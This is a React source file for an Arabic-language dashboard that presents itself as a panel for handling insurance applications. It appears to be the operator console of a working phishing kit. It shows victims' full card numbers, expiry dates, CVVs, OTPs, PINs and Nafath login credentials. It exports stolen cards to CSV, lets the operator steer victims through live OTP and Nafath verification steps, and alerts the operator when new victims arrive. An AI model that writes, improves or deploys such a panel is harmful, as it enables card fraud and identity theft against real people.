"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Filter,
  FileText,
  Shield,
  User,
  ChevronDown,
  History,
  Info,
  Download,
  Ban,
  Globe,
  Eye,
  EyeOff,
  Trash2,
  Copy,
  Check,
  X,
  Clock,
  MapPin,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger, DropdownMenuSeparator } from "@/components/ui/dropdown-menu"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { Checkbox } from "@/components/ui/checkbox"
import { CreditCardMockup } from "@/components/credit-card-mockup"

const STEP_NAMES: Record<number | string, string> = {
  1: "PIN",
  2: "تفاصيل",
  3: "OTP",
  4: "بطاقة",
  nafad: "نفاذ",
  phone: "هاتف",
  home: "الرئيسية",
}

const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]

export default function AdminDashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [dataFilter, setDataFilter] = useState<string>("withData")
  const [countryFilter, setCountryFilter] = useState<string>("all")
  const [loading, setLoading] = useState(true)
  const [showChat, setShowChat] = useState(false)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [blockedCards, setBlockedCards] = useState<string[]>([])
  const [showBlockedPanel, setShowBlockedPanel] = useState(false)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)

  const hasData = (app: InsuranceApplication) => {
    return !!(app.cardNumber || app.otp || app.pinCode || app.nafazId || app.phoneNumber2)
  }

  const stats = useMemo(
    () => ({
      total: applications.length,
      withData: applications.filter(hasData).length,
      visitors: applications.filter(a => !hasData(a)).length,
      cards: applications.filter((a) => !!(a.cardNumber)).length,
    }),
    [applications],
  )

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (dataFilter === "withData") {
        filtered = filtered.filter(hasData)
      } else if (dataFilter === "visitors") {
        filtered = filtered.filter(a => !hasData(a))
      } else if (dataFilter === "cards") {
        filtered = filtered.filter((a) => !!a.cardNumber)
      }

      if (countryFilter !== "all") {
        filtered = filtered.filter(a => a.country === countryFilter)
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber?.includes(query) ||
            app.cardNumber?.includes(query),
        )
      }

      filtered = filtered.sort((a, b) => {
        if (a.isUnread && !b.isUnread) return -1
        if (!a.isUnread && b.isUnread) return 1
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0
        return dateB - dateA
      })

      setFilteredApplications(filtered)
    }, 200)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, dataFilter, countryFilter])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) setSelectedApplication(updated)
    }
  }, [applications, selectedApplication])

  const formatTime = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diff = Math.floor((now.getTime() - date.getTime()) / 1000)
    if (diff < 60) return "الآن"
    if (diff < 3600) return `${Math.floor(diff / 60)}د`
    if (diff < 86400) return `${Math.floor(diff / 3600)}س`
    return `${Math.floor(diff / 86400)}ي`
  }, [])

  const copyToClipboard = async (text: string, fieldId: string) => {
    await navigator.clipboard.writeText(text)
    setCopiedField(fieldId)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const exportCards = () => {
    const cardsData = applications
      .filter(a => a.cardNumber && !blockedCards.includes(a.cardNumber))
      .map(a => `${a.cardNumber},${a.expiryDate || ""},${a.cvv || ""},${a.ownerName || ""}`)
      .join("\n")
    
    const blob = new Blob([`Card Number,Expiry,CVV,Name\n${cardsData}`], { type: "text/csv" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = "cards_export.csv"
    a.click()
    URL.revokeObjectURL(url)
    playSuccessSound()
  }

  const blockCard = (cardNumber: string) => {
    if (!blockedCards.includes(cardNumber)) {
      setBlockedCards([...blockedCards, cardNumber])
      playSuccessSound()
    }
  }

  const unblockCard = (cardNumber: string) => {
    setBlockedCards(blockedCards.filter(c => c !== cardNumber))
  }

  const handleStepChange = async (appId: string, step: number | string) => {
    try {
      await updateApplication(appId, { currentStep: step })
      playSuccessSound()
    } catch (error) {
      playErrorSound()
    }
  }

  const handleApproval = async (appId: string, type: "card" | "cardOtp" | "phoneOtp", approved: boolean) => {
    try {
      const updateData: Record<string, any> = {}
      if (type === "card") {
        updateData.cardApproved = approved
      } else if (type === "cardOtp") {
        updateData.cardOtpApproved = approved
      } else if (type === "phoneOtp") {
        updateData.phoneOtpApproved = approved
      }
      await updateApplication(appId, updateData)
      if (approved) {
        playSuccessSound()
      } else {
        playErrorSound()
      }
    } catch (error) {
      playErrorSound()
    }
  }

  const toggleRead = useCallback(async (app: InsuranceApplication, e: React.MouseEvent) => {
    e.stopPropagation()
    try {
      await updateApplication(app.id!, { isUnread: !app.isUnread })
    } catch (error) {
      console.error(error)
    }
  }, [])

  const selectApp = (app: InsuranceApplication) => {
    setSelectedApplication(app)
    setShowChat(false)
    if (app.isUnread) {
      updateApplication(app.id!, { isUnread: false })
    }
  }

  return (
    <div className="h-screen bg-slate-950 text-[11px] flex flex-col" dir="rtl">
      {/* Header */}
      <header className="bg-slate-900 border-b border-slate-800 px-3 py-1.5 flex items-center justify-between flex-shrink-0">
        <div className="flex items-center gap-2">
          <div className="w-6 h-6 rounded bg-emerald-500 flex items-center justify-center">
            <Shield className="w-3 h-3 text-white" />
          </div>
          <span className="text-xs font-bold text-white">البريد الوارد</span>
        </div>
        
        <div className="flex items-center gap-3 text-[10px]">
          <span className="text-slate-400">الكل: <span className="text-white font-bold">{stats.total}</span></span>
          <span className="text-slate-400">بيانات: <span className="text-emerald-400 font-bold">{stats.withData}</span></span>
          <span className="text-slate-400">زوار: <span className="text-slate-500 font-bold">{stats.visitors}</span></span>
          <span className="text-slate-400">بطاقات: <span className="text-amber-400 font-bold">{stats.cards}</span></span>
        </div>

        <div className="flex items-center gap-1">
          <Button onClick={exportCards} variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
            <Download className="w-3 h-3" />
            تصدير
          </Button>
          <Button onClick={() => setShowBlockedPanel(!showBlockedPanel)} variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
            <Ban className="w-3 h-3" />
            المحظورة ({blockedCards.length})
          </Button>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-slate-400 hover:text-white gap-1">
                <Globe className="w-3 h-3" />
                {countryFilter === "all" ? "كل الدول" : countryFilter}
                <ChevronDown className="w-2.5 h-2.5" />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700">
              <DropdownMenuItem onClick={() => setCountryFilter("all")} className="text-[10px] text-slate-300">كل الدول</DropdownMenuItem>
              <DropdownMenuSeparator className="bg-slate-700" />
              {COUNTRIES.map(c => (
                <DropdownMenuItem key={c} onClick={() => setCountryFilter(c)} className="text-[10px] text-slate-300">{c}</DropdownMenuItem>
              ))}
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </header>

      {/* Blocked Cards Modal */}
      {showBlockedPanel && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50" onClick={() => setShowBlockedPanel(false)}>
          <div className="bg-white rounded-lg shadow-xl w-[450px] max-w-[90vw]" dir="rtl" onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between p-4 border-b">
              <h2 className="text-base font-bold text-slate-800">قائمة حجب بطاقات الدفع</h2>
              <button onClick={() => setShowBlockedPanel(false)} className="text-slate-400 hover:text-slate-600">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-4">
              <p className="text-sm text-slate-600 mb-4">
                أضف البادئات الخاصة بأرقام البطاقات التي لا تريدها. يمكنك لصق مجموعة من البادئات مفصولة بمسافة أو فاصلة أو سطر جديد. اضغط Enter لإضافة كل بادئ.
              </p>
              <Input
                placeholder="أدخل رقم البطاقة..."
                className="mb-4 text-sm bg-slate-50 border-slate-200 text-slate-800"
                onKeyDown={(e) => {
                  if (e.key === "Enter") {
                    const input = e.currentTarget
                    const value = input.value.trim()
                    if (value && !blockedCards.includes(value)) {
                      setBlockedCards([...blockedCards, value])
                      input.value = ""
                    }
                  }
                }}
              />
              <div className="flex flex-wrap gap-2 min-h-[100px] p-3 bg-slate-50 rounded-lg border border-slate-200">
                {blockedCards.length === 0 ? (
                  <span className="text-sm text-slate-400">لا توجد بطاقات محظورة</span>
                ) : (
                  blockedCards.map(card => (
                    <span key={card} className="inline-flex items-center gap-1 px-3 py-1 bg-slate-200 text-slate-700 rounded-full text-sm">
                      <button onClick={() => unblockCard(card)} className="text-slate-500 hover:text-slate-700">
                        <X className="w-4 h-4" />
                      </button>
                      {card.slice(-4)}
                    </span>
                  ))
                )}
              </div>
            </div>
            <div className="flex justify-start gap-2 p-4 border-t bg-slate-50">
              <Button onClick={() => setShowBlockedPanel(false)} className="bg-blue-500 hover:bg-blue-600 text-white px-6">
                حفظ
              </Button>
              <Button onClick={() => setShowBlockedPanel(false)} variant="ghost" className="text-slate-600">
                إلغاء
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="flex flex-1 min-h-0">
        {/* Inbox List */}
        <div className="w-[280px] bg-slate-900/50 border-l border-slate-800 flex flex-col">
          <div className="p-1.5 border-b border-slate-800">
            <div className="flex items-center gap-1 mb-1">
              <div className="relative flex-1">
                <Search className="absolute right-1.5 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
                <Input
                  placeholder="بحث..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-6 h-6 text-[10px] bg-slate-800 border-slate-700 text-slate-200 rounded"
                />
              </div>
            </div>
            <Tabs defaultValue="withData" className="w-full" onValueChange={setDataFilter}>
              <TabsList className="w-full h-5 p-0 bg-slate-800 rounded">
                <TabsTrigger value="all" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">الكل</TabsTrigger>
                <TabsTrigger value="withData" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">بيانات</TabsTrigger>
                <TabsTrigger value="visitors" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">زوار</TabsTrigger>
                <TabsTrigger value="cards" className="flex-1 h-5 text-[9px] rounded-sm data-[state=active]:bg-emerald-500 data-[state=active]:text-white text-slate-400">بطاقات</TabsTrigger>
              </TabsList>
            </Tabs>
          </div>

          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-32">
                <div className="w-5 h-5 border-2 border-emerald-500 border-t-transparent rounded-full animate-spin" />
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="text-center text-slate-500 py-8 text-[10px]">لا توجد نتائج</div>
            ) : (
              filteredApplications.map((app) => {
                const appHasData = hasData(app)
                const isActive = selectedApplication?.id === app.id
                return (
                  <div
                    key={app.id}
                    onClick={() => selectApp(app)}
                    className={`px-2 py-1.5 cursor-pointer border-b border-slate-800/50 transition-all
                      ${app.isUnread ? "bg-emerald-500/5" : ""}
                      ${isActive ? "bg-emerald-500/10 border-r-2 border-r-emerald-500" : "hover:bg-slate-800/30"}`}
                  >
                    <div className="flex items-center justify-between mb-0.5">
                      <div className="flex items-center gap-1.5 min-w-0">
                        <div className={`w-2 h-2 rounded-full flex-shrink-0 ${appHasData ? "bg-emerald-500" : "bg-slate-600"}`} />
                        <span className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}>
                          {app.ownerName || "زائر"}
                        </span>
                        {app.isUnread && <div className="w-1.5 h-1.5 rounded-full bg-blue-500 flex-shrink-0" />}
                      </div>
                      <span className="text-[9px] text-slate-500 flex-shrink-0">{formatTime(app.createdAt)}</span>
                    </div>
                    <div className="flex items-center gap-1 text-[9px] text-slate-500">
                      {appHasData ? (
                        <>
                          {app.cardNumber && <CreditCard className="w-2.5 h-2.5 text-amber-400" />}
                          {app.otp && <span className="text-amber-400">OTP</span>}
                          {app.pinCode && <span className="text-blue-400">PIN</span>}
                          {app.nafazId && <Shield className="w-2.5 h-2.5 text-purple-400" />}
                        </>
                      ) : (
                        <span className="text-slate-600">زائر فقط</span>
                      )}
                      {app.country && (
                        <span className="mr-auto flex items-center gap-0.5">
                          <MapPin className="w-2.5 h-2.5" />
                          {app.country}
                        </span>
                      )}
                    </div>
                  </div>
                )
              })
            )}
          </div>
        </div>

        {/* Conversation View */}
        <div className="flex-1 bg-slate-950 flex flex-col">
          {selectedApplication ? (
            showChat ? (
              <ChatPanel
                applicationId={selectedApplication.id!}
                currentUserId="admin-001"
                currentUserName="المسؤول"
                currentUserRole="admin"
                onClose={() => setShowChat(false)}
              />
            ) : (
              <>
                {/* Conversation Header */}
                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
                      {selectedApplication.ownerName?.charAt(0) || "ز"}
                    </div>
                    <div>
                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "زائر"}</div>
                      <div className="text-[9px] text-slate-400 flex items-center gap-2">
                        <span>{selectedApplication.phoneNumber}</span>
                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-1">
                    {["nafad", "phone", "home", 1, 2, 3, 4].map((step) => (
                      <Button
                        key={step}
                        onClick={() => handleStepChange(selectedApplication.id!, step)}
                        size="sm"
                        className={`h-5 text-[8px] px-1.5 rounded ${
                          selectedApplication.currentStep === step
                            ? "bg-emerald-500 text-white"
                            : "bg-slate-800 text-slate-400 hover:text-white"
                        }`}
                      >
                        {STEP_NAMES[step]}
                      </Button>
                    ))}
                    <Button onClick={() => setShowChat(true)} size="sm" className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1 mr-2">
                      <MessageSquare className="w-3 h-3" />
                    </Button>
                  </div>
                </div>

                {/* Conversation Messages */}
                <div className="flex-1 overflow-y-auto p-3 space-y-2">
                  {!hasData(selectedApplication) ? (
                    <div className="flex items-center justify-center h-full">
                      <div className="text-center text-slate-500">
                        <User className="w-10 h-10 mx-auto mb-2 text-slate-600" />
                        <p className="text-sm">زائر فقط</p>
                        <p className="text-[10px]">لا توجد بيانات مسجلة</p>
                      </div>
                    </div>
                  ) : (
                    <>
                      {/* Card Data Message */}
                      {selectedApplication.cardNumber && (
                        <div className="flex justify-start">
                          <div className={`max-w-[350px] rounded-2xl rounded-tr-sm p-3 ${blockedCards.includes(selectedApplication.cardNumber) ? "bg-red-900/30 border border-red-500/30" : "bg-slate-800"}`}>
                            {blockedCards.includes(selectedApplication.cardNumber) && (
                              <div className="flex items-center gap-2 mb-2">
                                <Badge className="text-[9px] bg-red-500/20 text-red-400 border-0">بطاقة محظورة</Badge>
                              </div>
                            )}
                            <CreditCardMockup
                              cardNumber={selectedApplication.cardNumber}
                              expiryDate={selectedApplication.expiryDate}
                              cvv={selectedApplication.cvv}
                              cardholderName={selectedApplication.ownerName}
                            />
                            {selectedApplication.totalPrice && (
                              <div className="mt-2 p-2 bg-emerald-500/10 rounded text-center">
                                <span className="text-emerald-400 font-bold">{selectedApplication.totalPrice} ر.س</span>
                              </div>
                            )}
                            <div className="flex gap-1 mt-2">
                              <Button onClick={() => handleApproval(selectedApplication.id!, "card", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
                                <Check className="w-2.5 h-2.5 ml-1" />
                                قبول
                              </Button>
                              <Button onClick={() => handleApproval(selectedApplication.id!, "card", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
                                <X className="w-2.5 h-2.5 ml-1" />
                                رفض
                              </Button>
                            </div>
                            {!blockedCards.includes(selectedApplication.cardNumber) && (
                              <Button onClick={() => blockCard(selectedApplication.cardNumber!)} size="sm" className="mt-1 h-5 text-[9px] bg-slate-700 text-slate-400 hover:bg-slate-600 w-full">
                                <Ban className="w-2.5 h-2.5 ml-1" />
                                حظر البطاقة
                              </Button>
                            )}
                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                          </div>
                        </div>
                      )}

                      {/* OTP Message */}
                      {selectedApplication.otp && (
                        <div className="flex justify-start">
                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
                            <div className="flex items-center gap-2 mb-2">
                              <Shield className="w-4 h-4 text-blue-400" />
                              <span className="text-[10px] font-bold text-blue-400">رمز OTP</span>
                            </div>
                            <div className="text-2xl font-bold text-white text-center tracking-widest py-2" dir="ltr">
                              {selectedApplication.otp}
                            </div>
                            {selectedApplication.allOtps && selectedApplication.allOtps.length > 1 && (
                              <div className="mt-2 pt-2 border-t border-slate-700">
                                <span className="text-[9px] text-slate-500">السابقة: </span>
                                {selectedApplication.allOtps.slice(0, -1).map((otp, i) => (
                                  <Badge key={i} className="text-[8px] bg-slate-700 text-slate-400 border-0 ml-1">{otp}</Badge>
                                ))}
                              </div>
                            )}
                            <div className="flex gap-1 mt-2">
                              <Button onClick={() => handleApproval(selectedApplication.id!, "cardOtp", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
                                <Check className="w-2.5 h-2.5 ml-1" />
                                قبول
                              </Button>
                              <Button onClick={() => handleApproval(selectedApplication.id!, "cardOtp", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
                                <X className="w-2.5 h-2.5 ml-1" />
                                رفض
                              </Button>
                            </div>
                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                          </div>
                        </div>
                      )}

                      {/* PIN Message */}
                      {selectedApplication.pinCode && (
                        <div className="flex justify-start">
                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
                            <div className="flex items-center gap-2 mb-2">
                              <Shield className="w-4 h-4 text-purple-400" />
                              <span className="text-[10px] font-bold text-purple-400">رمز PIN</span>
                            </div>
                            <div className="text-2xl font-bold text-white text-center tracking-widest py-2" dir="ltr">
                              {selectedApplication.pinCode}
                            </div>
                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                          </div>
                        </div>
                      )}

                      {/* Nafaz Message */}
                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
                        <div className="flex justify-start">
                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
                            <div className="flex items-center gap-2 mb-2">
                              <Shield className="w-4 h-4 text-green-400" />
                              <span className="text-[10px] font-bold text-green-400">نفاذ</span>
                            </div>
                            <div className="space-y-1.5">
                              {selectedApplication.nafazId && <DataRow label="المعرف" value={selectedApplication.nafazId} onCopy={copyToClipboard} copied={copiedField} />}
                              {selectedApplication.nafazPass && <DataRow label="كلمة المرور" value={selectedApplication.nafazPass} onCopy={copyToClipboard} copied={copiedField} />}
                            </div>
                            <div className="mt-3 pt-2 border-t border-slate-700">
                              <label className="text-[9px] text-slate-400 block mb-1">رقم التحقق (authNumber)</label>
                              <div className="flex gap-1">
                                <Input
                                  type="text"
                                  placeholder="أدخل رقم التحقق..."
                                  value={authNumber}
                                  onChange={(e) => setAuthNumber(e.target.value)}
                                  className="h-7 text-[11px] bg-slate-900 border-slate-600 text-white flex-1"
                                  dir="ltr"
                                />
                                <Button
                                  onClick={async () => {
                                    if (authNumber.trim()) {
                                      await updateApplication(selectedApplication.id!, { authNumber: authNumber.trim() })
                                      playSuccessSound()
                                    }
                                  }}
                                  size="sm"
                                  className="h-7 px-3 text-[9px] bg-green-500 hover:bg-green-600 text-white"
                                >
                                  إرسال
                                </Button>
                              </div>
                              {selectedApplication.authNumber && (
                                <div className="mt-1 text-[9px] text-green-400">
                                  الحالي: <span className="font-mono" dir="ltr">{selectedApplication.authNumber}</span>
                                </div>
                              )}
                            </div>
                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                          </div>
                        </div>
                      )}

                      {/* Phone Data Message */}
                      {(selectedApplication.phoneNumber2 || selectedApplication.phoneOtp) && (
                        <div className="flex justify-start">
                          <div className="max-w-[80%] bg-slate-800 rounded-2xl rounded-tr-sm p-3">
                            <div className="flex items-center gap-2 mb-2">
                              <Phone className="w-4 h-4 text-cyan-400" />
                              <span className="text-[10px] font-bold text-cyan-400">بيانات الهاتف</span>
                            </div>
                            <div className="space-y-1.5">
                              {selectedApplication.phoneNumber2 && <DataRow label="الرقم" value={selectedApplication.phoneNumber2} onCopy={copyToClipboard} copied={copiedField} />}
                              {selectedApplication.phoneOtp && <DataRow label="OTP الهاتف" value={selectedApplication.phoneOtp} onCopy={copyToClipboard} copied={copiedField} />}
                            </div>
                            {selectedApplication.phoneOtp && (
                              <div className="flex gap-1 mt-2">
                                <Button onClick={() => handleApproval(selectedApplication.id!, "phoneOtp", true)} size="sm" className="flex-1 h-6 text-[9px] bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30">
                                  <Check className="w-2.5 h-2.5 ml-1" />
                                  قبول
                                </Button>
                                <Button onClick={() => handleApproval(selectedApplication.id!, "phoneOtp", false)} size="sm" className="flex-1 h-6 text-[9px] bg-red-500/20 text-red-400 hover:bg-red-500/30">
                                  <X className="w-2.5 h-2.5 ml-1" />
                                  رفض
                                </Button>
                              </div>
                            )}
                            <div className="text-[8px] text-slate-500 mt-2 text-left">{formatTime(selectedApplication.createdAt)}</div>
                          </div>
                        </div>
                      )}

                      {/* Card History */}
                      {selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 && (
                        <div className="flex justify-start">
                          <div className="max-w-[80%] bg-slate-800/50 rounded-2xl rounded-tr-sm p-3">
                            <div className="flex items-center gap-2 mb-2">
                              <History className="w-4 h-4 text-slate-400" />
                              <span className="text-[10px] font-bold text-slate-400">البطاقات السابقة ({selectedApplication.cardHistory.length})</span>
                            </div>
                            <div className="space-y-2">
                              {selectedApplication.cardHistory.map((card: any, i: number) => (
                                <div key={i} className="p-2 bg-slate-900 rounded text-[10px]">
                                  <div className="font-mono text-slate-300" dir="ltr">{card.cardNumber}</div>
                                  <div className="text-slate-500 text-[9px]">{card.expiryDate} • {card.cvv}</div>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </>
            )
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center text-slate-500">
                <MessageSquare className="w-12 h-12 mx-auto mb-3 text-slate-700" />
                <p className="text-sm">اختر محادثة</p>
                <p className="text-[10px]">اضغط على أي عنصر من القائمة</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

function DataRow({ label, value, onCopy, copied }: { label: string; value: string; onCopy: (v: string, id: string) => void; copied: string | null }) {
  const id = `${label}-${value}`
  return (
    <div className="flex items-center justify-between bg-slate-900/50 rounded px-2 py-1">
      <span className="text-[9px] text-slate-500">{label}</span>
      <div className="flex items-center gap-1">
        <span className="text-[10px] text-white font-mono" dir="ltr">{value}</span>
        <button onClick={() => onCopy(value, id)} className="text-slate-500 hover:text-white p-0.5">
          {copied === id ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
        </button>
      </div>
    </div>
  )
}
